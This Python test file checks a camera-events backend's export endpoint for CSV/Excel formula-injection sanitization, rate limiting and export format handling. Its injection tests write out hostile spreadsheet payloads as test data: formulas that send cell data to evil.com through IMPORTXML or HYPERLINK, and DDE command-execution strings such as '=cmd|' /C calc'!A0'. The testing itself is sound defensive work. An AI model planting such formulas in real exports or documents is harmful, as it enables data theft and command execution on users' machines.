"""Unit tests for events export endpoint CSV injection protection (NEM-1111) and rate limiting (NEM-1080).

Tests verify that:
1. The CSV export properly sanitizes cell values to prevent formula injection attacks
   when users open exported CSV files in spreadsheet applications like Excel,
   LibreOffice Calc, or Google Sheets.
2. Rate limiting is properly applied to prevent abuse of the export endpoint.

CSV injection characters that must be escaped:
- = (formula start)
- + (formula start)
- - (formula start)
- @ (Excel/Google Sheets formula)
- \\t (tab - can be used in formula injection)
- \\r (carriage return - can be used in formula injection)
"""

import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import HTTPException, status


class TestCSVInjectionProtection:
    """Tests for CSV injection protection in events export endpoint."""

    # Characters that trigger formula injection in spreadsheet applications
    INJECTION_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

    @pytest.mark.asyncio
    async def test_summary_with_equals_formula_is_sanitized(self):
        """Test that summary starting with = is sanitized to prevent formula injection."""
        malicious_summary = '=HYPERLINK("http://evil.com","Click here")'

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_summary)

        # The sanitized value should NOT start with =
        assert not sanitized.startswith("="), f"Value '{sanitized}' should not start with ="
        # It should be prefixed with a single quote
        assert sanitized.startswith("'="), f"Value '{sanitized}' should start with '="

    @pytest.mark.asyncio
    async def test_summary_with_plus_formula_is_sanitized(self):
        """Test that summary starting with + is sanitized to prevent formula injection."""
        malicious_summary = "+1+1"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_summary)

        assert not sanitized.startswith("+"), f"Value '{sanitized}' should not start with +"
        assert sanitized.startswith("'+"), f"Value '{sanitized}' should start with '+"

    @pytest.mark.asyncio
    async def test_summary_with_minus_formula_is_sanitized(self):
        """Test that summary starting with - is sanitized to prevent formula injection."""
        malicious_summary = "-1+1"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_summary)

        assert not sanitized.startswith("-"), f"Value '{sanitized}' should not start with -"
        assert sanitized.startswith("'-"), f"Value '{sanitized}' should start with '-"

    @pytest.mark.asyncio
    async def test_summary_with_at_formula_is_sanitized(self):
        """Test that summary starting with @ is sanitized to prevent formula injection."""
        malicious_summary = "@SUM(A1:A10)"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_summary)

        assert not sanitized.startswith("@"), f"Value '{sanitized}' should not start with @"
        assert sanitized.startswith("'@"), f"Value '{sanitized}' should start with '@"

    @pytest.mark.asyncio
    async def test_summary_with_tab_injection_is_sanitized(self):
        """Test that summary starting with tab is sanitized to prevent injection."""
        malicious_summary = "\t=cmd|' /C calc'!A0"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_summary)

        assert not sanitized.startswith("\t"), f"Value '{sanitized}' should not start with tab"
        assert sanitized.startswith("'\t"), f"Value '{sanitized}' should start with 'tab"

    @pytest.mark.asyncio
    async def test_summary_with_carriage_return_injection_is_sanitized(self):
        """Test that summary starting with carriage return is sanitized."""
        malicious_summary = "\r=cmd|' /C calc'!A0"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_summary)

        assert not sanitized.startswith("\r"), (
            f"Value '{sanitized}' should not start with carriage return"
        )
        assert sanitized.startswith("'\r"), f"Value '{sanitized}' should start with 'CR"

    @pytest.mark.asyncio
    async def test_normal_summary_not_modified(self):
        """Test that normal summaries without injection characters are not modified."""
        normal_summary = "Person detected near front entrance"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(normal_summary)

        assert sanitized == normal_summary, "Normal values should not be modified"

    @pytest.mark.asyncio
    async def test_empty_summary_handled(self):
        """Test that empty/None summaries are handled correctly."""
        from backend.api.routes.events import sanitize_csv_value

        assert sanitize_csv_value("") == ""
        assert sanitize_csv_value(None) == ""

    @pytest.mark.asyncio
    async def test_camera_name_with_formula_is_sanitized(self):
        """Test that camera names with injection characters are sanitized."""
        malicious_camera_name = '=IMPORTXML(CONCAT("http://evil.com/?data=",A1),"//a")'

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(malicious_camera_name)

        assert not sanitized.startswith("="), "Camera name should be sanitized"
        assert sanitized.startswith("'="), "Camera name should be prefixed with quote"

    @pytest.mark.asyncio
    async def test_dde_attack_vector_sanitized(self):
        """Test that DDE (Dynamic Data Exchange) attack vectors are sanitized.

        DDE allows executing arbitrary commands in Excel when a user clicks
        to enable content. Example: =cmd|'/C calc'!A0
        """
        dde_payload = "=cmd|'/C calc'!A0"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(dde_payload)

        assert not sanitized.startswith("="), "DDE payload should be sanitized"

    @pytest.mark.asyncio
    async def test_hyperlink_attack_vector_sanitized(self):
        """Test that HYPERLINK formula injection is sanitized."""
        hyperlink_payload = '=HYPERLINK("http://evil.com/steal?data="&A1,"Click Me")'

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(hyperlink_payload)

        assert not sanitized.startswith("="), "HYPERLINK payload should be sanitized"

    @pytest.mark.asyncio
    async def test_importxml_attack_vector_sanitized(self):
        """Test that IMPORTXML formula injection is sanitized (Google Sheets specific)."""
        importxml_payload = '=IMPORTXML(CONCAT("http://evil.com/?data=",A1),"//a")'

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(importxml_payload)

        assert not sanitized.startswith("="), "IMPORTXML payload should be sanitized"

    @pytest.mark.asyncio
    async def test_value_with_injection_char_in_middle_not_modified(self):
        """Test that values with injection chars in middle (not start) are not modified."""
        safe_value = "Person detected at 10:00 - near door"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(safe_value)

        assert sanitized == safe_value, "Values with - in middle should not be modified"

    @pytest.mark.asyncio
    async def test_numeric_string_starting_with_minus_is_sanitized(self):
        """Test that numeric-looking strings starting with - are sanitized.

        Even if it looks like a negative number, we sanitize to be safe since
        spreadsheets might interpret it as a formula.
        """
        negative_looking = "-100"

        from backend.api.routes.events import sanitize_csv_value

        sanitized = sanitize_csv_value(negative_looking)

        # Negative numbers should be sanitized to be safe
        assert sanitized.startswith("'-"), "Negative-looking values should be sanitized"


class TestCSVExportEndpointIntegration:
    """Integration tests for the CSV export endpoint with CSV injection protection.

    These tests verify that the export_events endpoint properly sanitizes
    all exported field values.
    """

    @pytest.mark.asyncio
    async def test_export_endpoint_sanitizes_summary_field(self):
        """Test that the export endpoint sanitizes summary field values."""
        # This test will require setting up the full endpoint with mocked DB
        # For now, we document the expected behavior
        pass

    @pytest.mark.asyncio
    async def test_export_endpoint_sanitizes_camera_name_field(self):
        """Test that the export endpoint sanitizes camera name field values."""
        pass


class TestSanitizationEdgeCases:
    """Edge case tests for the CSV sanitization function."""

    @pytest.mark.asyncio
    async def test_whitespace_only_values(self):
        """Test handling of whitespace-only values."""
        from backend.api.routes.events import sanitize_csv_value

        assert sanitize_csv_value("   ") == "   ", "Whitespace should be preserved"

    @pytest.mark.asyncio
    async def test_unicode_values(self):
        """Test that Unicode values are handled correctly."""
        from backend.api.routes.events import sanitize_csv_value

        unicode_value = "Person detected - description"
        assert sanitize_csv_value(unicode_value) == unicode_value

    @pytest.mark.asyncio
    async def test_newline_in_value(self):
        """Test that values with embedded newlines are handled."""
        from backend.api.routes.events import sanitize_csv_value

        value_with_newline = "Line 1\nLine 2"
        sanitized = sanitize_csv_value(value_with_newline)
        # Newline at start would be an issue, but not in the middle
        assert sanitized == value_with_newline

    @pytest.mark.asyncio
    async def test_already_quoted_value(self):
        """Test that values already starting with quote are handled correctly."""
        from backend.api.routes.events import sanitize_csv_value

        # A value that already starts with a quote should not get double-quoted
        quoted_value = "'Some text"
        sanitized = sanitize_csv_value(quoted_value)
        # Should remain unchanged since it doesn't start with injection char
        assert sanitized == quoted_value

    @pytest.mark.asyncio
    async def test_multiple_injection_chars(self):
        """Test values with multiple injection characters."""
        from backend.api.routes.events import sanitize_csv_value

        # Only the first character matters for injection
        value = "=+@-\t\r"
        sanitized = sanitize_csv_value(value)
        assert sanitized.startswith("'="), "Should prefix with quote"


# =============================================================================
# Rate Limiting Tests for Events Export Endpoint (NEM-1080)
# =============================================================================


@pytest.fixture(autouse=True)
def reset_settings_cache():
    """Reset settings cache before each test."""
    from backend.core.config import get_settings

    get_settings.cache_clear()
    # Also clear the trusted proxy cache
    from backend.api.middleware.rate_limit import clear_trusted_proxy_cache

    clear_trusted_proxy_cache()
    yield
    get_settings.cache_clear()
    clear_trusted_proxy_cache()


@pytest.fixture
def mock_redis():
    """Create a mock Redis client with properly mocked pipeline."""
    mock = MagicMock()
    mock._client = MagicMock()

    # Create a mock pipeline that supports async context
    mock_pipe = MagicMock()
    mock_pipe.zremrangebyscore = MagicMock()
    mock_pipe.zcard = MagicMock()
    mock_pipe.zadd = MagicMock()
    mock_pipe.expire = MagicMock()
    mock_pipe.execute = AsyncMock(return_value=[0, 5, 1, True])

    # _ensure_connected is a sync method that returns a Redis client
    mock_redis_client = MagicMock()
    mock_redis_client.pipeline = MagicMock(return_value=mock_pipe)
    mock._ensure_connected = MagicMock(return_value=mock_redis_client)

    return mock


@pytest.fixture
def mock_request():
    """Create a mock FastAPI request."""
    request = MagicMock()
    request.client = MagicMock()
    request.client.host = "192.168.1.100"
    request.headers = {}
    return request


class TestExportRateLimitTier:
    """Tests for the EXPORT rate limit tier."""

    def test_export_tier_exists(self):
        """Test that EXPORT tier is defined in RateLimitTier enum."""
        from backend.api.middleware.rate_limit import RateLimitTier

        assert hasattr(RateLimitTier, "EXPORT")
        assert RateLimitTier.EXPORT.value == "export"

    def test_export_tier_limits(self):
        """Test that export tier returns configured limits."""
        with patch.dict(os.environ, {"RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10"}):
            from backend.api.middleware.rate_limit import RateLimitTier, get_tier_limits
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limits = get_tier_limits(RateLimitTier.EXPORT)

            assert limits[0] == 10  # requests_per_minute
            assert limits[1] == 0  # no burst allowance for export

    def test_export_tier_has_no_burst(self):
        """Test that export tier has no burst allowance to prevent abuse."""
        with patch.dict(os.environ, {"RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "15"}):
            from backend.api.middleware.rate_limit import RateLimitTier, get_tier_limits
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limits = get_tier_limits(RateLimitTier.EXPORT)

            # Export tier should have 0 burst to prevent abuse
            assert limits[1] == 0

    def test_export_tier_limit_customizable(self):
        """Test that export tier limit can be customized via environment."""
        with patch.dict(os.environ, {"RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "5"}):
            from backend.api.middleware.rate_limit import RateLimitTier, get_tier_limits
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limits = get_tier_limits(RateLimitTier.EXPORT)

            assert limits[0] == 5


class TestExportRateLimiterFunction:
    """Tests for the rate_limit_export convenience function."""

    def test_rate_limit_export_returns_limiter(self):
        """Test that rate_limit_export returns a RateLimiter with EXPORT tier."""
        from backend.api.middleware.rate_limit import (
            RateLimiter,
            RateLimitTier,
            rate_limit_export,
        )

        limiter = rate_limit_export()

        assert isinstance(limiter, RateLimiter)
        assert limiter.tier == RateLimitTier.EXPORT


class TestExportRateLimiting:
    """Tests for rate limiting behavior on export endpoint."""

    @pytest.mark.asyncio
    async def test_export_rate_limit_under_limit_allowed(self, mock_redis, mock_request):
        """Test that export requests under limit are allowed."""
        with (
            patch.dict(
                os.environ,
                {
                    "RATE_LIMIT_ENABLED": "true",
                    "RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10",
                },
            ),
            patch(
                "backend.api.middleware.rate_limit._execute_rate_limit_script",
                new_callable=AsyncMock,
                return_value=(True, 5),  # allowed, count=5
            ),
        ):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limiter = RateLimiter(tier=RateLimitTier.EXPORT)
            is_allowed, count, limit = await limiter._check_rate_limit(mock_redis, "192.168.1.100")

            assert is_allowed is True
            assert count == 5
            # Export tier has no burst, so limit equals requests_per_minute
            assert limit == 10

    @pytest.mark.asyncio
    async def test_export_rate_limit_at_limit_denied(self, mock_redis, mock_request):
        """Test that export requests at the limit are denied."""
        with (
            patch.dict(
                os.environ,
                {
                    "RATE_LIMIT_ENABLED": "true",
                    "RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10",
                },
            ),
            patch(
                "backend.api.middleware.rate_limit._execute_rate_limit_script",
                new_callable=AsyncMock,
                return_value=(False, 10),  # denied, count=10 (at limit)
            ),
        ):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limiter = RateLimiter(tier=RateLimitTier.EXPORT)
            is_allowed, count, limit = await limiter._check_rate_limit(mock_redis, "192.168.1.100")

            assert is_allowed is False
            assert count == 10
            assert limit == 10

    @pytest.mark.asyncio
    async def test_export_rate_limit_raises_429_when_exceeded(self, mock_redis, mock_request):
        """Test that exceeding export rate limit raises 429 HTTPException."""
        with patch.dict(
            os.environ,
            {
                "RATE_LIMIT_ENABLED": "true",
                "RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10",
            },
        ):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            # Mock the Lua script to return denied (count over limit)
            with patch(
                "backend.api.middleware.rate_limit._execute_rate_limit_script",
                new_callable=AsyncMock,
                return_value=(False, 15),  # denied, count=15
            ):
                limiter = RateLimiter(tier=RateLimitTier.EXPORT)

                with pytest.raises(HTTPException) as exc_info:
                    await limiter(mock_request, mock_redis)

            assert exc_info.value.status_code == status.HTTP_429_TOO_MANY_REQUESTS
            assert "Too many requests" in exc_info.value.detail["error"]
            assert exc_info.value.detail["tier"] == "export"

    @pytest.mark.asyncio
    async def test_export_rate_limit_includes_retry_after_header(self, mock_redis, mock_request):
        """Test that 429 response includes Retry-After header."""
        with patch.dict(
            os.environ,
            {
                "RATE_LIMIT_ENABLED": "true",
                "RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10",
            },
        ):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            # Mock the Lua script to return denied (count over limit)
            with patch(
                "backend.api.middleware.rate_limit._execute_rate_limit_script",
                new_callable=AsyncMock,
                return_value=(False, 15),  # denied, count=15
            ):
                limiter = RateLimiter(tier=RateLimitTier.EXPORT)

                with pytest.raises(HTTPException) as exc_info:
                    await limiter(mock_request, mock_redis)

            headers = exc_info.value.headers
            assert "Retry-After" in headers
            assert headers["Retry-After"] == "60"  # 60 seconds window

    @pytest.mark.asyncio
    async def test_export_rate_limit_includes_rate_limit_headers(self, mock_redis, mock_request):
        """Test that 429 response includes X-RateLimit-* headers."""
        with patch.dict(
            os.environ,
            {
                "RATE_LIMIT_ENABLED": "true",
                "RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10",
            },
        ):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            # Mock the Lua script to return denied (count over limit)
            with patch(
                "backend.api.middleware.rate_limit._execute_rate_limit_script",
                new_callable=AsyncMock,
                return_value=(False, 15),  # denied, count=15
            ):
                limiter = RateLimiter(tier=RateLimitTier.EXPORT)

                with pytest.raises(HTTPException) as exc_info:
                    await limiter(mock_request, mock_redis)

            headers = exc_info.value.headers
            assert "X-RateLimit-Limit" in headers
            assert headers["X-RateLimit-Limit"] == "10"  # 10 with no burst
            assert headers["X-RateLimit-Remaining"] == "0"
            assert "X-RateLimit-Reset" in headers

    @pytest.mark.asyncio
    async def test_export_rate_limit_disabled_allows_all(self, mock_redis, mock_request):
        """Test that requests are allowed when rate limiting is disabled."""
        with patch.dict(os.environ, {"RATE_LIMIT_ENABLED": "false"}):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limiter = RateLimiter(tier=RateLimitTier.EXPORT)
            is_allowed, count, _limit = await limiter._check_rate_limit(mock_redis, "192.168.1.100")

            assert is_allowed is True
            assert count == 0

    @pytest.mark.asyncio
    async def test_export_rate_limit_redis_error_fails_open(self, mock_redis, mock_request):
        """Test that Redis errors result in allowing requests (fail-open)."""
        with (
            patch.dict(
                os.environ,
                {
                    "RATE_LIMIT_ENABLED": "true",
                    "RATE_LIMIT_EXPORT_REQUESTS_PER_MINUTE": "10",
                },
            ),
            patch(
                "backend.api.middleware.rate_limit._execute_rate_limit_script",
                new_callable=AsyncMock,
                side_effect=Exception("Redis connection failed"),
            ),
        ):
            from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier
            from backend.core.config import get_settings

            get_settings.cache_clear()

            limiter = RateLimiter(tier=RateLimitTier.EXPORT)
            is_allowed, count, _limit = await limiter._check_rate_limit(mock_redis, "192.168.1.100")

            # Should fail open
            assert is_allowed is True
            assert count == 0


class TestExportRateLimitKeyGeneration:
    """Tests for export rate limit Redis key generation."""

    def test_export_rate_limit_key_format(self):
        """Test that export rate limit uses correct Redis key format."""
        from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier

        limiter = RateLimiter(tier=RateLimitTier.EXPORT)
        key = limiter._make_key("192.168.1.100")

        assert key == "rate_limit:export:192.168.1.100"

    def test_export_rate_limit_key_unique_per_ip(self):
        """Test that different IPs get different rate limit keys."""
        from backend.api.middleware.rate_limit import RateLimiter, RateLimitTier

        limiter = RateLimiter(tier=RateLimitTier.EXPORT)

        key_a = limiter._make_key("192.168.1.100")
        key_b = limiter._make_key("192.168.1.200")

        assert key_a != key_b
        assert "192.168.1.100" in key_a
        assert "192.168.1.200" in key_b


class TestExportConfigSettings:
    """Tests for export rate limit configuration settings."""

    def test_export_rate_limit_default_value(self):
        """Test that export rate limit has correct default value."""
        with patch.dict(
            os.environ,
            {
                "DATABASE_URL": "postgresql+asyncpg://test:test@localhost:5432/test",
            },
            clear=False,
        ):
            from backend.core.config import get_settings

            get_settings.cache_clear()
            settings = get_settings()

            # Default should be 10 requests per minute
            assert settings.rate_limit_export_requests_per_minute == 10

    def test_export_rate_limit_minimum_value(self):
        """Test that export rate limit has minimum constraint of 1."""
        # The Field constraint ge=1 should enforce minimum of 1
        from backend.core.config import Settings

        # Just verify the field exists and has proper constraints
        field_info = Settings.model_fields.get("rate_limit_export_requests_per_minute")
        assert field_info is not None
        # Check the metadata for ge constraint
        assert field_info.metadata is not None or field_info.ge == 1

    def test_export_rate_limit_maximum_value(self):
        """Test that export rate limit has maximum constraint of 100."""
        # The Field constraint le=100 should enforce maximum of 100
        from backend.core.config import Settings

        field_info = Settings.model_fields.get("rate_limit_export_requests_per_minute")
        assert field_info is not None


# =============================================================================
# Multi-Format Export Tests (NEM-2088)
# =============================================================================


class TestExportFormatDetection:
    """Tests for export format detection via Accept header."""

    @pytest.mark.asyncio
    async def test_csv_accept_header_returns_csv(self):
        """Test that Accept: text/csv returns CSV format."""
        from backend.services.export_service import ExportFormat, parse_accept_header

        assert parse_accept_header("text/csv") == ExportFormat.CSV
        assert parse_accept_header("application/csv") == ExportFormat.CSV

    @pytest.mark.asyncio
    async def test_excel_accept_header_returns_excel(self):
        """Test that Excel Accept headers return Excel format."""
        from backend.services.export_service import ExportFormat, parse_accept_header

        # Standard XLSX MIME type
        xlsx_mime = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        assert parse_accept_header(xlsx_mime) == ExportFormat.EXCEL

        # Legacy Excel MIME type
        assert parse_accept_header("application/vnd.ms-excel") == ExportFormat.EXCEL

        # Shorthand
        assert parse_accept_header("application/xlsx") == ExportFormat.EXCEL

    @pytest.mark.asyncio
    async def test_no_accept_header_defaults_to_csv(self):
        """Test that missing Accept header defaults to CSV."""
        from backend.services.export_service import ExportFormat, parse_accept_header

        assert parse_accept_header(None) == ExportFormat.CSV
        assert parse_accept_header("") == ExportFormat.CSV

    @pytest.mark.asyncio
    async def test_unknown_accept_header_defaults_to_csv(self):
        """Test that unknown Accept header defaults to CSV."""
        from backend.services.export_service import ExportFormat, parse_accept_header

        # Unknown types default to CSV
        assert parse_accept_header("text/html") == ExportFormat.CSV
        assert parse_accept_header("application/xml") == ExportFormat.CSV
        # application/json defaults to CSV since JSON export isn't supported
        assert parse_accept_header("application/json") == ExportFormat.CSV

    @pytest.mark.asyncio
    async def test_accept_header_with_quality_values(self):
        """Test parsing Accept header with quality values."""
        from backend.services.export_service import ExportFormat, parse_accept_header

        # CSV with quality value
        assert parse_accept_header("text/csv;q=0.9") == ExportFormat.CSV

        # Multiple types with quality values - CSV is preferred
        accept = "text/csv;q=0.9, text/plain;q=0.8"
        assert parse_accept_header(accept) == ExportFormat.CSV


class TestExportFilenameGeneration:
    """Tests for export filename generation."""

    @pytest.mark.asyncio
    async def test_csv_filename_extension(self):
        """Test CSV filename has .csv extension."""
        from backend.services.export_service import ExportFormat, generate_export_filename

        filename = generate_export_filename("events_export", ExportFormat.CSV)
        assert filename.endswith(".csv")
        assert filename.startswith("events_export_")

    @pytest.mark.asyncio
    async def test_excel_filename_extension(self):
        """Test Excel filename has .xlsx extension."""
        from backend.services.export_service import ExportFormat, generate_export_filename

        filename = generate_export_filename("events_export", ExportFormat.EXCEL)
        assert filename.endswith(".xlsx")
        assert filename.startswith("events_export_")

    @pytest.mark.asyncio
    async def test_filename_includes_timestamp(self):
        """Test filename includes timestamp."""
        from backend.services.export_service import ExportFormat, generate_export_filename

        filename = generate_export_filename("test", ExportFormat.CSV)

        # Should have format: test_YYYYMMDD_HHMMSS.csv
        parts = filename.replace(".csv", "").split("_")
        assert len(parts) >= 3  # test, date, time

        # Date part should be 8 digits
        date_part = parts[1]
        assert len(date_part) == 8
        assert date_part.isdigit()

        # Time part should be 6 digits
        time_part = parts[2]
        assert len(time_part) == 6
        assert time_part.isdigit()


class TestExportContentTypes:
    """Tests for export MIME types."""

    @pytest.mark.asyncio
    async def test_csv_content_type(self):
        """Test CSV MIME type is correct."""
        from backend.services.export_service import EXPORT_MIME_TYPES, ExportFormat

        assert EXPORT_MIME_TYPES[ExportFormat.CSV] == "text/csv"

    @pytest.mark.asyncio
    async def test_excel_content_type(self):
        """Test Excel MIME type is correct."""
        from backend.services.export_service import EXPORT_MIME_TYPES, ExportFormat

        expected = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        assert EXPORT_MIME_TYPES[ExportFormat.EXCEL] == expected


class TestExcelExportGeneration:
    """Tests for Excel export generation."""

    @pytest.mark.asyncio
    async def test_excel_export_returns_bytes(self):
        """Test Excel export returns bytes."""
        from datetime import UTC, datetime

        from backend.services.export_service import EventExportRow, events_to_excel

        events = [
            EventExportRow(
                event_id=1,
                camera_name="Test Camera",
                started_at=datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC),
                ended_at=None,
                risk_score=50,
                risk_level="medium",
                summary="Test event",
                detection_count=1,
                reviewed=False,
            ),
        ]

        content = events_to_excel(events)

        assert isinstance(content, bytes)
        assert len(content) > 0

    @pytest.mark.asyncio
    async def test_excel_export_is_valid_xlsx(self):
        """Test Excel export is a valid XLSX file (ZIP archive)."""
        from datetime import UTC, datetime

        from backend.services.export_service import EventExportRow, events_to_excel

        events = [
            EventExportRow(
                event_id=1,
                camera_name="Test",
                started_at=datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC),
                ended_at=None,
                risk_score=50,
                risk_level="medium",
                summary="Test",
                detection_count=1,
                reviewed=False,
            ),
        ]

        content = events_to_excel(events)

        # XLSX files are ZIP archives and start with "PK" signature
        assert content[:2] == b"PK"

    @pytest.mark.asyncio
    async def test_excel_export_can_be_loaded(self):
        """Test Excel export can be loaded by openpyxl."""
        import io
        from datetime import UTC, datetime

        from openpyxl import load_workbook

        from backend.services.export_service import EventExportRow, events_to_excel

        events = [
            EventExportRow(
                event_id=1,
                camera_name="Front Door",
                started_at=datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC),
                ended_at=datetime(2024, 1, 15, 10, 31, 0, tzinfo=UTC),
                risk_score=75,
                risk_level="high",
                summary="Person detected",
                detection_count=3,
                reviewed=True,
            ),
        ]

        content = events_to_excel(events)

        # Load workbook and verify structure
        wb = load_workbook(io.BytesIO(content))
        ws = wb.active

        # Check header row
        assert ws.cell(row=1, column=1).value == "Event ID"
        assert ws.cell(row=1, column=2).value == "Camera"

        # Check data row
        assert ws.cell(row=2, column=1).value == 1
        assert ws.cell(row=2, column=2).value == "Front Door"

    @pytest.mark.asyncio
    async def test_excel_export_sanitizes_injection_values(self):
        """Test Excel export sanitizes values with injection characters."""
        import io
        from datetime import UTC, datetime

        from openpyxl import load_workbook

        from backend.services.export_service import EventExportRow, events_to_excel

        # Create event with injection attempt in summary
        events = [
            EventExportRow(
                event_id=1,
                camera_name="Test",
                started_at=datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC),
                ended_at=None,
                risk_score=50,
                risk_level="medium",
                summary='=HYPERLINK("http://evil.com","Click")',
                detection_count=1,
                reviewed=False,
            ),
        ]

        content = events_to_excel(events)
        wb = load_workbook(io.BytesIO(content))
        ws = wb.active

        # Summary column should be sanitized (starts with quote)
        summary_value = ws.cell(row=2, column=7).value  # summary is 7th column
        assert summary_value.startswith("'=")

    @pytest.mark.asyncio
    async def test_excel_export_empty_events_list(self):
        """Test Excel export with empty events list."""
        import io

        from openpyxl import load_workbook

        from backend.services.export_service import events_to_excel

        content = events_to_excel([])

        # Should still be valid XLSX with header row only
        assert content[:2] == b"PK"

        wb = load_workbook(io.BytesIO(content))
        ws = wb.active

        # Header row should exist
        assert ws.cell(row=1, column=1).value == "Event ID"

        # No data rows
        assert ws.cell(row=2, column=1).value is None
